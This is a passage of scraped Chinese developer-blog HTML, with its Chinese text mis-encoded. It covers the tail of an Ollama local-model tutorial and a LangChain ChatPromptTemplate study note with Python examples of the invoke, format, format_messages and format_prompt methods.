<pre><code class="hljs language-perl" lang="perl">ollama create <span class="hljs-keyword">my</span>-qwen -f Modelfile
ollama run <span class="hljs-keyword">my</span>-qwen
</code></pre>
<hr/>
<h3 data-id="heading-13">ğŸ—‘ 7. æ¸…ç†ä¸ç®¡ç†</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ é™¤æŸä¸ªæ¨¡å‹</span>
ollama <span class="hljs-built_in">rm</span> qwen:7b

<span class="hljs-comment"># åˆ é™¤æ‰€æœ‰æœªä½¿ç”¨çš„æ¨¡å‹ï¼ˆè°¨æ…ï¼‰</span>
ollama prune

<span class="hljs-comment"># æŸ¥çœ‹æ¨¡å‹å­˜å‚¨ä½ç½®ï¼ˆmacOSï¼‰</span>
<span class="hljs-built_in">ls</span> ~/.ollama/models/
</code></pre>
<blockquote>
<p>æ¨¡å‹é»˜è®¤å­˜å‚¨åœ¨ <code>~/.ollama/models/</code>ï¼Œå ç”¨è¾ƒå¤§ç©ºé—´ï¼ˆ8B æ¨¡å‹çº¦ 5GBï¼‰ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-14">âš™ï¸ 8. é«˜çº§æŠ€å·§</h3>
<h4 data-id="heading-15">âœ… åœ¨ M ç³»åˆ— Mac ä¸ŠåŠ é€Ÿ</h4>
<p>Ollama è‡ªåŠ¨ä½¿ç”¨ Apple Metal GPU åŠ é€Ÿï¼Œæ— éœ€é¢å¤–é…ç½®ã€‚</p>
<h4 data-id="heading-16">âœ… é™åˆ¶æ˜¾å­˜/å†…å­˜ä½¿ç”¨</h4>
<p>é€šè¿‡ <code>num_ctx</code> å’Œé‡åŒ–ç‰ˆæœ¬æ§åˆ¶èµ„æºï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">ollama pull qwen3:<span class="hljs-number">8b</span>-q4_K_M  # <span class="hljs-number">4</span>-bit é‡åŒ–ï¼Œæ›´çœå†…å­˜
</code></pre>
<h4 data-id="heading-17">âœ… ä¸ Dify / LM Studio é›†æˆ</h4>
<ul>
<li><strong>Dify</strong>ï¼šåœ¨æ¨¡å‹è®¾ç½®ä¸­é€‰æ‹© â€œOllamaâ€ï¼Œå¡«å…¥Â <code>http://localhost:11434</code>Â å’Œæ¨¡å‹åã€‚</li>
<li><strong>LM Studio</strong>ï¼šå¯ç›´æ¥å¯¼å…¥ Ollama æ¨¡å‹ï¼ˆéƒ¨åˆ†å…¼å®¹ï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-18">â“ å¸¸è§é—®é¢˜</h3>
<h4 data-id="heading-19">Qï¼š<code>pull</code>Â å¤ªæ…¢æ€ä¹ˆåŠï¼Ÿ</h4>
<p>Aï¼šä½¿ç”¨ä»£ç†æˆ–å›½å†…é•œåƒï¼ˆå¦‚é­”æ­ ModelScopeï¼‰ï¼Œä½† Ollama å®˜æ–¹æš‚ä¸æ”¯æŒç›´æ¥æ¢æºã€‚</p>
<h4 data-id="heading-20">Qï¼šæ¨¡å‹æ— æ³•å¯åŠ¨ï¼ŒæŠ¥é”™Â <code>out of memory</code>ï¼Ÿ</h4>
<p>Aï¼šå°è¯•æ›´å°çš„æ¨¡å‹ï¼ˆå¦‚ <code>qwen:4b</code> æˆ– <code>phi3:mini</code>ï¼‰ï¼Œæˆ–ä½¿ç”¨ 4-bit é‡åŒ–ç‰ˆã€‚</p>
<h4 data-id="heading-21">Qï¼šå¦‚ä½•æŸ¥çœ‹æ¨¡å‹æ”¯æŒçš„æœ€å¤§ä¸Šä¸‹æ–‡ï¼Ÿ</h4>
<p>Aï¼š</p>
<pre><code class="hljs language-sql" lang="sql">ollama <span class="hljs-keyword">show</span> qwen3:<span class="hljs-number">8</span>b <span class="hljs-comment">--modelfile</span>
</code></pre>
<p>æŸ¥æ‰¾ <code>num_ctx</code> å‚æ•°ã€‚</p>
<hr/>
<h3 data-id="heading-22">ğŸ”— å‚è€ƒé“¾æ¥</h3>
<ul>
<li>å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">ollama.com</a></li>
<li>GitHubï¼š<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">github.com/ollama/ollaâ€¦</a></li>
<li>æ¨¡å‹åº“ï¼š<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">ollama.com/library</a></li>
<li>API æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">github.com/ollama/ollaâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€ŒLangChainå­¦ä¹ ã€ChatPromptTemplateå­¦ä¹ ç¬”è®°]]></title>    <link>https://juejin.cn/post/7589159665856299027</link>    <guid>https://juejin.cn/post/7589159665856299027</guid>    <pubDate>2025-12-29T15:43:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589159665856299027" data-draft-id="7589099845186945060" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€ŒLangChainå­¦ä¹ ã€ChatPromptTemplateå­¦ä¹ ç¬”è®°"/> <meta itemprop="keywords" content="LangChain,æœºå™¨å­¦ä¹ "/> <meta itemprop="datePublished" content="2025-12-29T15:43:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ·¡é…’äº¤é­‚"/> <meta itemprop="url" content="https://juejin.cn/user/2245627735450160"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€ŒLangChainå­¦ä¹ ã€ChatPromptTemplateå­¦ä¹ ç¬”è®°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2245627735450160/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ·¡é…’äº¤é­‚
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T15:43:15.000Z" title="Mon Dec 29 2025 15:43:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä½¿ç”¨è¯´æ˜</h2>
<p>ChatPromptTemplateæ˜¯åˆ›å»º<code>èŠå¤©æ¶ˆæ¯åˆ—è¡¨</code>çš„æ¨¡ç‰ˆï¼Œæ¯”PromptTemplateæ›´é€‚åˆå¤„ç†å¤šè§’è‰²ã€å¤šè½®æ¬¡çš„å¯¹è¯åœºæ™¯</p>
<h2 data-id="heading-1">ç‰¹ç‚¹</h2>
<ul>
<li>æ”¯æŒ<code>System/AI/Human</code>ç­‰ä¸åŒè§’è‰²çš„æ¶ˆæ¯æ¨¡æ¿</li>
<li>å†å²å¯¹è¯çš„ç»´æŠ¤</li>
</ul>
<h2 data-id="heading-2">å‚æ•°ç±»å‹</h2>
<p>å‚æ•°ï¼š</p>
<ul>
<li>role-è§’è‰²</li>
<li>content-æ¶ˆæ¯å†…å®¹</li>
</ul>
<p>åˆ—è¡¨å‚æ•°æ ¼å¼æ˜¯tupleç±»å‹ï¼ˆrole :str content :str ç»„åˆæœ€å¸¸ç”¨ï¼‰</p>
<p>å…ƒç»„çš„æ ¼å¼ä¸ºï¼š<code>(role: str | type, content: str | list[dict] | list[object])</code></p>
<p>å…¶ä¸­<code>role</code>æ˜¯ï¼šå­—ç¬¦ä¸²ï¼ˆå¸¸ç”¨:"system"ã€"human"ã€"ai"ï¼‰</p>
<h2 data-id="heading-3">å®ä¾‹åŒ–æ–¹æ³•</h2>
<h4 data-id="heading-4">1.æ„é€ æ–¹æ³•</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate

prompt = ChatPromptTemplate([
    (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ {name}."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?"</span>),
    (<span class="hljs-string">"ai"</span>, <span class="hljs-string">"æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"{user_input}"</span>)
])


<span class="hljs-comment"># &lt;class 'langchain_core.prompt_values.ChatPromptValue'&gt;</span>
<span class="hljs-built_in">print</span>(prompt.invoke({<span class="hljs-string">"name"</span>:<span class="hljs-string">"å°æ™º"</span>, <span class="hljs-string">"user_input"</span>:<span class="hljs-string">"ä»‹ç»ä¸€ä¸‹è‡ªç„¶è¯­è¨€å¤„ç†"</span>}))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(prompt.invoke({<span class="hljs-string">"name"</span>:<span class="hljs-string">"å°æ™º"</span>, <span class="hljs-string">"user_input"</span>:<span class="hljs-string">"ä»‹ç»ä¸€ä¸‹è‡ªç„¶è¯­è¨€å¤„ç†"</span>})))

//è¾“å‡ºç»“æœ
messages=[SystemMessage(content=<span class="hljs-string">'ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ å°æ™º.'</span>, additional_kwargs={}, response_metadata={}), HumanMessage(content=<span class="hljs-string">'ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?'</span>, additional_kwargs={}, response_metadata={}), AIMessage(content=<span class="hljs-string">'æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰.'</span>, additional_kwargs={}, response_metadata={}), HumanMessage(content=<span class="hljs-string">'ä»‹ç»ä¸€ä¸‹è‡ªç„¶è¯­è¨€å¤„ç†'</span>, additional_kwargs={}, response_metadata={})]
&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'langchain_core.prompt_values.ChatPromptValue'</span>&gt;
</code></pre>
<h4 data-id="heading-5">2.è°ƒç”¨from_messages()</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate

promptMessage = ChatPromptTemplate.from_messages([
     (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ {name}."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?"</span>),
    (<span class="hljs-string">"ai"</span>, <span class="hljs-string">"æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"{user_input}"</span>)
])
promptMsg = promptMessage.invoke(<span class="hljs-built_in">input</span>={<span class="hljs-string">"name"</span>: <span class="hljs-string">"å°æ™º"</span>, <span class="hljs-string">"user_input"</span>: <span class="hljs-string">"æè¿°ä¸€ä¸‹å›¾åƒè¯†åˆ«æŠ€æœ¯"</span>})
<span class="hljs-built_in">print</span>(promptMsg)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(promptMsg))

//è¾“å‡º
messages=[SystemMessage(content=<span class="hljs-string">'ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ å°æ™º.'</span>, additional_kwargs={}, response_metadata={}), HumanMessage(content=<span class="hljs-string">'ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?'</span>, additional_kwargs={}, response_metadata={}), AIMessage(content=<span class="hljs-string">'æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰.'</span>, additional_kwargs={}, response_metadata={}), HumanMessage(content=<span class="hljs-string">'æè¿°ä¸€ä¸‹å›¾åƒè¯†åˆ«æŠ€æœ¯'</span>, additional_kwargs={}, response_metadata={})]
&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'langchain_core.prompt_values.ChatPromptValue'</span>&gt;
</code></pre>
<p>ä¸Šé¢ä¸¤ç§å®ä¾‹åŒ–æ–¹æ³•ç»è¿‡invoke()æ–¹æ³•è°ƒç”¨å‡è·å¾—ChatPromptValueç±»å‹çš„å®ä¾‹ï¼Œä½†åˆæ˜¯ä¼ ç»™AIçš„å¸Œæœ›æ˜¯ä¸ªå¯¹è¯å†å²ï¼Œå¸Œæœ›ä»¥æ¶ˆæ¯åˆ—è¡¨çš„æ–¹æ³•ä¼ é€’ç»™AIï¼Œæ‰€ä»¥åˆ›å»ºå¥½Templateåï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„æ–¹æ³•è·å–ä¸åŒçš„æ•°æ®ç±»å‹ï¼Œï¼ˆå½“ç„¶å¯ä»¥é€šè¿‡æ–¹æ³•è½¬æ¢è·å–ä¸åŒçš„æ•°æ®ç±»å‹ï¼‰ï¼Œä¸‹é¢å°±è®²ä¸€ä¸‹å››ä¸ªå¸¸ç”¨çš„æ¨¡æ¿è°ƒç”¨çš„æ–¹æ³•</p>
<h2 data-id="heading-6">æ¨¡æ¿è°ƒç”¨çš„å››ç§æ–¹å¼</h2>
<ul>
<li>æ–¹å¼1ï¼šinvoke() -&gt; <code>ChatPromptValue</code></li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate

prompt = ChatPromptTemplate([
    (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ {name}."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?"</span>),
    (<span class="hljs-string">"ai"</span>, <span class="hljs-string">"æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"{user_input}"</span>)
])

<span class="hljs-comment"># &lt;class 'langchain_core.prompt_values.ChatPromptValue'&gt;</span>
<span class="hljs-built_in">print</span>(prompt.invoke({<span class="hljs-string">"name"</span>: <span class="hljs-string">"å°æ™º"</span>, <span class="hljs-string">"user_input"</span>: <span class="hljs-string">"ä»‹ç»ä¸€ä¸‹è‡ªç„¶è¯­è¨€å¤„ç†"</span>}))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(prompt.invoke({<span class="hljs-string">"name"</span>: <span class="hljs-string">"å°æ™º"</span>, <span class="hljs-string">"user_input"</span>: <span class="hljs-string">"ä»‹ç»ä¸€ä¸‹è‡ªç„¶è¯­è¨€å¤„ç†"</span>})))

//è¾“å‡º
messages=[SystemMessage(content=<span class="hljs-string">'ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ å°æ™º.'</span>, additional_kwargs={}, response_metadata={}), HumanMessage(content=<span class="hljs-string">'ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?'</span>, additional_kwargs={}, response_metadata={}), AIMessage(content=<span class="hljs-string">'æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰.'</span>, additional_kwargs={}, response_metadata={}), HumanMessage(content=<span class="hljs-string">'ä»‹ç»ä¸€ä¸‹è‡ªç„¶è¯­è¨€å¤„ç†'</span>, additional_kwargs={}, response_metadata={})]
&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'langchain_core.prompt_values.ChatPromptValue'</span>&gt;
</code></pre>
<ul>
<li>æ–¹å¼2ï¼šformat() -&gt; <code>str</code></li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate

prompt = ChatPromptTemplate([
    (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ {name}."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?"</span>),
    (<span class="hljs-string">"ai"</span>, <span class="hljs-string">"æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"{user_input}"</span>)
])

<span class="hljs-comment"># &lt;class 'str'&gt;</span>
<span class="hljs-built_in">print</span>(prompt.<span class="hljs-built_in">format</span>(name=<span class="hljs-string">"å°æ™º"</span>, user_input=<span class="hljs-string">"æµ‹è¯•æµ‹è¯•"</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(prompt.<span class="hljs-built_in">format</span>(name=<span class="hljs-string">"å°æ™º"</span>, user_input=<span class="hljs-string">"æµ‹è¯•æµ‹è¯•"</span>)))

//è¾“å‡º
System: ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ å°æ™º.
Human: ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?
AI: æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰.
Human: æµ‹è¯•æµ‹è¯•
&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'str'</span>&gt;
</code></pre>
<ul>
<li>æ–¹å¼3:format_messages() -&gt; <code>List&lt;BaseMessage&gt;</code></li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate

prompt = ChatPromptTemplate([
    (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ {name}."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?"</span>),
    (<span class="hljs-string">"ai"</span>, <span class="hljs-string">"æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"{user_input}"</span>)
])

<span class="hljs-comment"># &lt;class 'list'&gt;</span>
<span class="hljs-built_in">print</span>(prompt.format_messages(name=<span class="hljs-string">"å°æ™º"</span>, user_input=<span class="hljs-string">"æµ‹è¯•format_messagesæ–¹æ³•"</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(prompt.format_messages(name=<span class="hljs-string">"å°æ™º"</span>, user_input=<span class="hljs-string">"æµ‹è¯•format_messagesæ–¹æ³•"</span>)))

//è¾“å‡º
[SystemMessage(content=<span class="hljs-string">'ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ å°æ™º.'</span>, additional_kwargs={}, response_metadata={}), HumanMessage(content=<span class="hljs-string">'ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?'</span>, additional_kwargs={}, response_metadata={}), AIMessage(content=<span class="hljs-string">'æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰.'</span>, additional_kwargs={}, response_metadata={}), HumanMessage(content=<span class="hljs-string">'æµ‹è¯•format_messagesæ–¹æ³•'</span>, additional_kwargs={}, response_metadata={})]
&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'list'</span>&gt;
</code></pre>
<ul>
<li>æ–¹å¼4ï¼šformat_prompt() -&gt; <code>ChatPromptValue</code></li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate

prompt = ChatPromptTemplate([
    (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ {name}."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?"</span>),
    (<span class="hljs-string">"ai"</span>, <span class="hljs-string">"æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰."</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"{user_input}"</span>)
])

<span class="hljs-comment"># &lt;class 'langchain_core.prompt_values.ChatPromptValue'&gt;</span>
<span class="hljs-built_in">print</span>(prompt.format_prompt(name=<span class="hljs-string">"å°æ™º"</span>, user_input=<span class="hljs-string">"æµ‹è¯•format_promptæ–¹æ³•"</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(prompt.format_prompt(name=<span class="hljs-string">"å°æ™º"</span>, user_input=<span class="hljs-string">"æµ‹è¯•format_promptæ–¹æ³•"</span>)))

//è¾“å‡º
messages=[SystemMessage(content=<span class="hljs-string">'ä½ æ˜¯ä¸€ä¸ªAIå¼€å‘å·¥ç¨‹å¸ˆ. ä½ çš„åå­—æ˜¯ å°æ™º.'</span>, additional_kwargs={}, response_metadata={}), HumanMessage(content=<span class="hljs-string">'ä½ èƒ½å¼€å‘å“ªäº›AIåº”ç”¨?'</span>, additional_kwargs={}, response_metadata={}), AIMessage(content=<span class="hljs-string">'æˆ‘èƒ½å¼€å‘å¾ˆå¤šAIåº”ç”¨, æ¯”å¦‚èŠå¤©æœºå™¨äºº, å›¾åƒè¯†åˆ«, è‡ªç„¶è¯­è¨€å¤„ç†ç­‰.'</span>, additional_kwargs={}, response_metadata={}), HumanMessage(content=<span class="hljs-string">'æµ‹è¯•format_promptæ–¹æ³•'</span>, additional_kwargs={}, response_metadata={})]
&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'langchain_core.prompt_values.ChatPromptValue'</span>&gt;
</code></pre>
